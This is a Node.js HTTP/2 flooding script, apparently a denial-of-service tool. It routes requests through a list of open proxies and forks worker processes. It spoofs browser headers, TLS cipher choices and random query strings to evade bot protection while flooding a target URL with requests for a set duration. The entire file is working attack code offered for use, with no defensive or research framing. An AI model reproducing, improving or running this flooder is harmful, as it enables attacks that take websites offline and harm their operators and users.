// Code by @ThaiDuongScript 2024-09-13 

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const UserAgent = require("user-agents");
var colors = require("colors");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
  console.log(`Usage: node tls.js <target> <time> <rate> <thread> <proxyfile>`);
  process.exit();
}

const headers = {};
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

const ip_spoof = () => {
  const getRandomByte = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const spoofed = ip_spoof();

const ip_spoof1 = () => {
  const getRandomByte = () => {
    return Math.floor(Math.random() * 50000);
  };
  return `${getRandomByte()}`;
};

async function editedline() {
  try {} catch (error) {}
}

editedline();

const spoofed1 = ip_spoof1();

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  Rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  proxyFile: process.argv[6]
};

const sig = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512'
];
const sigalgs1 = sig.join(':');
const cplist = [
  "ECDHE-ECDSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-RSA-AES256-GCM-SHA384"
];
const accept_header = [
  '*/*',
  'image/*',
  'image/webp,image/apng',
  'text/html',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
];

lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-ZA'
];

const encoding_header = [
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
];

const control_header = ["no-cache", "max-age=0"];

const refers = [
  "https://www.google.com/",
  "https://www.facebook.com/",
  "https://www.twitter.com/",
  "https://www.youtube.com/",
  "https://www.linkedin.com/",
  "https://proxyscrape.com/",
  "https://www.instagram.com/",
  "https://wwww.reddit.com/",
  "https://fivem.net/",
  "https://www.fbi.gov/",
  "https://nettruyenplus.com/",
  "https://vnexpress.net/",
  "https://zalo.me/",
  "https://shopee.vn/",
  "https://www.tiktok.com/",
  "https://tuoitre.vn/",
  "https://thanhnien.vn/",
  "https://nettruyento.com/",
  "https://iristeam.sbs/" + "=" + randstr(20)
];
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers1 = "GREASE:" + [
  defaultCiphers[2],
  defaultCiphers[1],
  defaultCiphers[0],
  ...defaultCiphers.slice(3)
].join(":");
function randstra(length) {
const characters = "0123456789";
let result = "";
const charactersLength = characters.length;
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
return result;
}
const randomValue = Math.random();
var signature_0x1 = getRandomInt(82, 134);
const user_agent =  randomValue < 0.5 ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 Safari/537.36` : randomValue < 0.66 ? `Mozilla/5.0 (Macintosh; Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 Safari/537.36` : `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 Safari/537.36`;
    const u = [
user_agent,
];

function parse_headers(user_agent) {
     const osRegex = /\(([^)]+)\)/;
     const chromeRegex = /Chrome\/(\d+)/;

     const osMatch = user_agent.match(osRegex);
     const chromeMatch = user_agent.match(chromeRegex);

     let os = 'Windows';
     if (osMatch) {
          const osDetails = osMatch[1];
          if (osDetails.includes('Macintosh')) {
               os = 'macOS';
          } else if (osDetails.includes('Linux')) {
               os = 'Linux';
          } else if (osDetails.includes('Windows')) {
               os = 'Windows'
          }
     }

     const chromeVersion = chromeMatch ? parseInt(chromeMatch[1], 10) : 130;

     return { os: os, version: chromeVersion };
}
let chromium = parse_headers(user_agent)
const ngu =` ${chromium.os}`;



const rateHeaders = [
  { "akamai-origin-hop": randstr(12) },
  { "proxy-client-ip": randstr(12) },
  { "via": randstr(12) },
  { "cluster-ip": randstr(12) },
];
const rateHeaders2 = [
{ "A-IM": "Feed" },
{ "accept": accept },
{ "accept-charset": "UTF-8" },
{ "accept-datetime": accept },
{ "viewport-height":"1080"  },
{ "viewport-width": String(Math.floor(Math.random() * 300) + 300)  },
{ "Device-Memory" : String(Math.floor(Math.random() * 8) + 1) },
];
const rateHeaders3 = [
{ "dnt": "1"  },
{"Vary" : randstr(15)},
];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else { setInterval(runFlooder) }

class NetSocket {
  constructor() { }

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
      host: options.host,
      port: options.port
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);

    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", chunk => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");
      if (isAlive === false) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", error => {
      connection.destroy();
      return callback(undefined, "error: " + error);
    });
  }
}
queryLists = ['s', 'q', 'query', 'search', 'fbclid', 'id', 'name', 'item', 'user', 'userid', 'email', 'price', 'amount', 'quarntity', '_', 'history', 'page', 'where', 'line', 'limit', 'price', 'stock', 'lengths', 'ips', 'm', 'redirects', 'redirect_url', 'destination']
const random = queryLists[Math.floor(Math.floor(Math.random() * queryLists.length))];
const Socker = new NetSocket();
headers["TE"] = "trailers";
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + random + "=" + randstr(10);
headers[":scheme"] = "https";
headers["referer"] = "https://" + parsedTarget.host +"/" + random;
headers["origin"] = "https://www.google.com/" + "page=" + randstr(5) ;
headers["sec-ch-ua"] = `\"Google Chrome\";v=\"${signature_0x1}\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"${signature_0x1}\"`;
headers["sec-ch-ua-platform"] = ngu;
headers["sec-ch-ua-mobile"] = "?0";
headers["accept-encoding"] = encoding;
headers["accept-language"] = lang;
headers["user-agent"] = user_agent;
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = accept;
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-site"] = "same-origin";
headers["sec-fetch-user"] = "?1";
headers["set-cookie"] = randstra(1234);
headers["x-requested-with"] = "XMLHttpRequest";

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");

  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    timeout: 300,
  };

  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return;

    connection.setKeepAlive(true, 200000);

    const tlsOptions = {
       secure: true,
      ALPNProtocols: ['h2'],
      sigals: siga,
      requestCert: false,
      socket: connection,
      ciphers: cipper,
      ecdhCurve: "prime256v1:secp384r1:secp521r1",
      host: parsedTarget.host,
      rejectUnauthorized: false,
      servername: parsedTarget.host,
      secureProtocol: "TLS_method",
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

    tlsConn.setKeepAlive(true, 60000);

    const client = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 10000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 65536,
        enablePush: false
      },
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => tlsConn,
      socket: connection,
    });

    client.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 10000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 65536,
      enablePush: false
    });

    client.on("connect", () => {
      const IntervalAttack = setInterval(() => {
        const dynHeaders = {
          ...headers,
          ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
         ...rateHeaders2[Math.floor(Math.random() * rateHeaders2.length)],
         ...rateHeaders3[Math.floor(Math.random() * rateHeaders3.length)],
        };
        for (let i = 0; i < args.Rate; i++) {
          const request = client.request(dynHeaders);

          request.on("response", (headers) => {
            console.log(`(${'ThaiDuong'.bold.cyan}).  |. Proxy: ${proxyAddr}.  |. Target:${args.target}. |. Status: ${headers[':status']}. |. useragent:${user_agent}. |. sec-ch-ua:${`\"Google Chrome\";v=\"${signature_0x1}\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"${signature_0x1}\"`}. |. sec-ch-ua-platform: ${chromium.os} . `);
            request.close();
            request.destroy();
          });

          request.end();
        }
      }, 500);
    });

    client.on("close", () => {
      client.destroy();
      connection.destroy();
      return;
    });
  }, function (error, response, body) {
    connection.destroy();
    console.log("Error:", error);
  });
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);
